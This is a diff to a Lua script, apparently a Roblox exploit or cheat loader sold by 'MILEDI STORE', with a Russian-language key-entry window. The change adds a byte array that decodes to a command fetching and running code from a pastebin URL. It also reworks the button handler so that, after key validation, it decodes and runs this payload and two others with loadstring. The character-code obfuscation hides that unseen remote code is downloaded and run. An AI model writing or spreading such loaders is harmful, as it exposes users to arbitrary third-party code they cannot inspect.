@@ -53,7 +53,7 @@ local developerLabel = Instance.new("TextLabel", frame)
 developerLabel.Size = UDim2.new(1, -20, 0, 30)
 developerLabel.Position = UDim2.new(0, 10, 0, 100)
 developerLabel.BackgroundTransparency = 1
-developerLabel.Text = "Разработчик в Playerok : MILEDI STORE🔰"
+developerLabel.Text = "Разработчик: MILEDI STORE🔰"
 developerLabel.TextColor3 = Color3.new(1, 1, 1)
 developerLabel.Font = Enum.Font.Gotham
 developerLabel.TextSize = 18
@@ -62,7 +62,7 @@ developerLabel.TextXAlignment = Enum.TextXAlignment.Left
 local box = Instance.new("TextBox", frame)
 box.Size = UDim2.new(0.8, 0, 0, 36)
 box.Position = UDim2.new(0.1, 0, 0, 140)
-box.PlaceholderText = "Вставьте ключ от MILEDI STORE..."
+box.PlaceholderText = "Вставьте ключ..."
 box.Font = Enum.Font.Gotham
 box.TextSize = 20
 box.TextColor3 = Color3.fromRGB(50, 50, 50)
@@ -134,6 +134,12 @@ local scriptBytes2 = {
     99,121,47,109,97,105,110,47,67,104,105,108,108,105,46,108,117,97,34,41,41,40,41
 }
 
+local scriptBytes3 = {
+    108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,
+    104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,
+    122,104,101,52,105,101,48,87,34,41,41,40,41
+}
+
 button.MouseButton1Click:Connect(function()
     local input = box.Text:match("^%s*(.-)%s*$")
     if not validKey then
@@ -153,11 +159,14 @@ button.MouseButton1Click:Connect(function()
             if pct >= 1 then
                 conn:Disconnect()
                 gui:Destroy()
-                local str1, str2 = "", ""
-                for _, v in ipairs(scriptBytes1) do str1 = str1 .. string.char(v) end
-                for _, v in ipairs(scriptBytes2) do str2 = str2 .. string.char(v) end
-                loadstring(str1)()
-                loadstring(str2)()
+
+                for _, tbl in ipairs({scriptBytes1, scriptBytes2, scriptBytes3}) do
+                    local str = ""
+                    for _, v in ipairs(tbl) do
+                        str = str .. string.char(v)
+                    end
+                    loadstring(str)()
+                end
             end
         end)
     else
